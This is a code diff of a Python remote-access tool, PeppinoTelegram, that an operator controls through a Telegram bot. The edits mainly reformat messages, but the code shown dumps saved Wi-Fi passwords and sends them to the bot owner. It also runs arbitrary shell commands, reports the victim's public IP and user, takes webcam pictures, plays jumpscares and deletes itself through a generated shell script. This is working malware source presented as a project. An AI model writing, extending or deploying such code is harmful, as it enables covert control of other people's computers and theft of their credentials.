@@ -430,7 +430,7 @@ class WifiDumper:
         return wifis
 
     def __str__(self) -> str:
-        return "\n".join([f"{k} - {v}" for k,v in self.extract_all().items()])
+        return "\n".join([f"🛜 *{k}*\n🔑 `{v}`\n" for k,v in self.extract_all().items()])
 
 class ButtonsMenu:
     def __init__(self, chat_id: int, bot: Bot, buttons: dict[str, Callable], label: str = "Choose an action", autosend: bool=True, next_btn: bool=False, page_limit: int = 8, page: int=0, next_btn_lab: str = "next_page", prev_btn_lab: str = "previous_page", close_btn_lab="close_page", keyboard_rows=2) -> None:
@@ -732,7 +732,7 @@ class PeppinoTelegram:
                 "pss":self.pss,
                 "psst":self.pss,
                 "bsend":self.bsend,
-                "stop":sys.exit,
+                "stop":self.stop,
                 "altf4":self.altf4,
                 "breath":self.breath,
                 "browser":browseropen,
@@ -774,7 +774,7 @@ class PeppinoTelegram:
                 "randomkeyboard":self.randomkeyboard,
                 "terminateprocess":self.terminate_process_by_name,
                 "setvideowallpaper":self.setvideowallpaper,
-                "id":lambda:self.bsend(f"CHAT_ID: {self.owner_id}"),
+                "id":lambda:self.bsend(f"🆔 CHAT_ID: {self.owner_id}"),
                 "recordjum":self.record_jumpscare_reaction,
                 "mutevolume":lambda:self.audio_mixer.mute(),
                 "setvolume":self.audio_mixer.setVolumePercentage,
@@ -828,12 +828,12 @@ class PeppinoTelegram:
         def breath(self) -> None:
             self.__play_loaded_sound("breath")
 
-        def bsend(self, text: str, retries=0) -> int|None:
+        def bsend(self, text: str, retries=0, parse_mode:str|None=None) -> int|None:
             if retries>3:
                 return
             try:
                 if checkconn():
-                    return self.bot.sendMessage(self.owner_id, text)["message_id"]
+                    return self.bot.sendMessage(self.owner_id, text, parse_mode=parse_mode)["message_id"]
                 raise ConnectionError
             except Exception as e:
                 return self.bsend(text, retries+1)
@@ -890,7 +890,7 @@ class PeppinoTelegram:
             }
             self.display_mode_keyboard = self.new_menu(buttons, close_btn_lab="DISPLAYSET_close")
 
-        def execute(self, *command) -> None:
+        def execute(self, *command, return_output: bool=False) -> None:
             command = " ".join(command)
             s = sp.run(command, stdout=sp.PIPE, stderr=sp.PIPE, encoding="utf-8")
             if s.returncode:
@@ -899,7 +899,10 @@ class PeppinoTelegram:
                 output = s.stdout
     
             if output:
-                self.bsend(f"Output: {output}")
+                if return_output:
+                    return output
+                else:
+                    self.bsend(f"Output: {output}")
 
         def extract_commands(self) -> list[dict]:
             commands = findall(r'^([a-zA-Z0-9_]+) - (.*)', self.help, M)
@@ -936,7 +939,8 @@ class PeppinoTelegram:
             self.modded_screenshot(invert_image)
 
         def ipinfo(self):
-            self.execute("curl ifconfig.co")
+            output = self.execute("curl ifconfig.co", return_output=True)
+            self.bsend(f"🌐 Public IP: {output}")
 
         def johnpork(self, audio=True) -> None:
             self.jumpscare("johnpork_meme", "johnpork", playaudio=audio, setvolume=100)
@@ -1552,7 +1556,7 @@ class PeppinoTelegram:
             self.cantopenthread = Thread(target=self.cantopenkiller)
             self.cantopenthread.start()
             self.screen_width, self.screen_height = pg.size()
-            botstartedmessage = f"Bot started now, you have acces to {getlogin()}"
+            botstartedmessage = f"Bot started now, you have acces to 👤{getlogin()}"
             if not sys.argv[1:]:
                 if not self.selfie(botstartedmessage):
                     self.bsend(botstartedmessage)
@@ -1564,9 +1568,12 @@ class PeppinoTelegram:
                 try:
                     sleep(0.01)
                 except KeyboardInterrupt:
-                    self.bsend("Interrupted by host, bye bye")
+                    self.bsend("🛑 Interrupted by host machine, bye bye.")
                     self.clear()
                     break
+
+        def stop(self) -> None:
+            self.bsend("🛑 Interrupted by you, bye bye.")
 
         def terminate_process_by_name(self, process_name: str) -> None:
             for proc in psutil.process_iter():
@@ -1593,7 +1600,7 @@ class PeppinoTelegram:
                 with open(sh_file, "w") as f:
                     f.write(f'#!/bin/sh\nTARGET="{current_file}"\nwhile [ -e "$TARGET" ]; do\n\trm "$TARGET"\n\tsleep 0.5\n\tdone\n\trm -- "$0"')
                 chmod(sh_file, 0o700)
-                Popen(['sh', sh_file])                                                                                                       
+                Popen(['sh', sh_file]) 
             sys.exit(1)
 
         def waitforface(self, timeout=60):
@@ -1614,7 +1621,7 @@ class PeppinoTelegram:
             self.closecap()
 
         def wifiinfo(self) -> None:
-            self.bsend(f"Wifi-Info\n{str(self.wifidumper)}")
+            self.bsend(f"🌐 *Wifi-Info*\n\n{str(self.wifidumper)}", parse_mode="markdown")
 
 if __name__ == "__main__":
     token, chat_id = getCred() 
